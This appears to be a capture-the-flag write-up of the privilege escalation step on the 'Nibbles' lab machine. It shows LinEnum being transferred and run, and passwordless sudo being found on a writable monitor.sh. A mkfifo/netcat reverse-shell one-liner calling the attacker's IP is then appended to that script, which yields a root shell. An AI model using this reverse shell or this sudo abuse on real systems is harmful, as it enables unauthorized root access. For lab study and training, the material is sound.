---
icon: escalator
---

# Nibbles - Privilege Escalation

Unzip personal file and check script content:

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cat ./personal/stuff/monitor.sh
cat ./personal/stuff/monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
nibbler@Nibbles:/home/nibbler$ 

```

Using LinEnum.sh from [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Download and enable webserver on our machine:

```
┌──(kali㉿kali)-[~/Tools]
└─$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
--2024-11-20 10:43:09--  https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                                100%[=====================================================================================================================================>]  45.54K  --.-KB/s    in 0.04s   

2024-11-20 10:43:10 (1.02 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Tools]
└─$ ls -ltr
total 48
-rw-rw-r-- 1 kali kali 46631 Nov 20 10:43 LinEnum.sh
                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Tools]
└─$ sudo python3 -m http.server 8080
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.250.48 - - [20/Nov/2024 10:44:44] "GET /LinEnum.sh HTTP/1.1" 200 -

```

Downloading on victim's machine:

```
nibbler@Nibbles:/tmp$ wget http://10.10.15.193:8080/LinEnum.sh
wget http://10.10.15.193:8080/LinEnum.sh
--2024-11-20 10:44:44--  http://10.10.15.193:8080/LinEnum.sh
Connecting to 10.10.15.193:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K   229KB/s    in 0.2s    

2024-11-20 10:44:44 (229 KB/s) - 'LinEnum.sh' saved [46631/46631]

nibbler@Nibbles:/tmp$ ls -ltr
ls -ltr
total 56
drwx------ 3 root    root     4096 Nov 20 10:17 systemd-private-8ac3d2a2dbe14660988c319a08c3e028-systemd-timesyncd.service-CAEhVW
drwx------ 2 root    root     4096 Nov 20 10:17 vmware-root
-rw-r--r-- 1 nibbler nibbler 46631 Nov 20 10:43 LinEnum.sh
prw-r--r-- 1 nibbler nibbler     0 Nov 20 10:44 f
nibbler@Nibbles:/tmp$ chmod +x LinEnum.sh
chmod +x LinEnum.sh


```

```
nibbler@Nibbles:/tmp$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Nov 20 10:46:41 EST 2024   

[-] Super user account(s):
root


[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root    root    4.0K Dec 10  2017 .
drwxr-xr-x 23 root    root    4.0K Mar 12  2024 ..
drwxr-xr-x  3 nibbler nibbler 4.0K Mar 12  2021 nibbler


[-] Root is allowed to login via SSH:
PermitRootLogin yes

```

Appending one-liner to monitor.sh

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.193 8443 >/tmp/f' | tee -a monitor.sh

```



Running with sudo privilege:

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh

```

Starting listener and get reverse shell:

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8443
listening on [any] 8443 ...
connect to [10.10.15.193] from (UNKNOWN) [10.129.250.48] 45282
# whoami
root

```
